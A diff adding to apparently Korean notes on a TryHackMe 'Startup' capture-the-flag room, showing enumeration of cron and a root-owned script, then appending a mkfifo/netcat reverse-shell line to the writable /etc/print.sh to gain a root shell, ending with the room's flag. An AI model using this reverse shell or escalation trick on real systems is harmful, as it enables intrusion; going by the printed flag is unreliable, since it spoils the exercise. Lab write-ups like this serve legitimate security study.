@@ -804,4 +804,101 @@ No Sockets found in /var/run/screen/S-lennie.
 
 # SUID 파일 찾기
 
-find / -perm -4000 -type f 2>/dev/null  
+find / -perm -4000 -type f 2>/dev/null
+
+# /etc/print.sh
+
+lennie@startup:/etc$ cat /etc/print.sh 
+#!/bin/bash
+echo "Done!"
+
+lennie@startup:/etc$ ls -al /etc/print.sh 
+-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
+```bash
+lennie@startup:/etc$ crontab -l
+no crontab for lennie
+lennie@startup:/etc$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+```
+
+# /home/lennie/scripts/planner.sh
+
+lennie@startup:~/scripts$ cat planner.sh 
+#!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+lennie@startup:~/scripts$ 
+
+# startup_list.txt -> 아무것도 없음
+
+lennie@startup:~/scripts$ ls
+planner.sh  startup_list.txt
+lennie@startup:~/scripts$ cat startup_list.txt 
+
+# LIST 변수를 받으면 처리한다?
+
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+lennie@startup:~/scripts$ env | grep LIST
+lennie@startup:~/scripts$ env
+XDG_SESSION_ID=264
+SHELL=/bin/sh
+TERM=xterm
+SSH_CLIENT=192.168.130.36 60616 22
+SSH_TTY=/dev/pts/1
+USER=lennie
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+MAIL=/var/mail/lennie
+PWD=/home/lennie/scripts
+LANG=en_US.UTF-8
+SHLVL=2
+HOME=/home/lennie
+LOGNAME=lennie
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+SSH_CONNECTION=192.168.130.36 60616 10.65.164.25 22
+XDG_RUNTIME_DIR=/run/user/1002
+_=/usr/bin/env
+OLDPWD=/home/lennie
+
+# wow! root owner!? 
+
+drwx------ 7 lennie lennie 4096 Nov 23 13:13 ..
+-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
+-rw-r--r-- 1 root   root      1 Nov 23 13:25 startup_list.txt
+lennie@startup:~/scripts$ 
+
+> /home/lennie/scripts/planner.sh 이 root 소유인데 이 파일은 /etc/print.sh 을 실행하니까? 루트로 실행 됨 
+> 그러므로 /etc/print.sh 수정하면 루트로 실행 됨!
+
+vim /etc/print.sh
+# reverse shell
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.36 1234 >/tmp/f' >> /etc/print.sh
+
+cd ~
+cd scripts
+./planner.sh
+
+# rooting
+
+┌──(kali㉿kali)-[~/workspace/kali]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.130.36] from (UNKNOWN) [10.65.164.25] 56764
+/bin/sh: 0: can't access tty; job control turned off
+# ls
+root.txt
+# cat root.txt
+THM{f963aaa6a430f210222158ae15c3d76d}
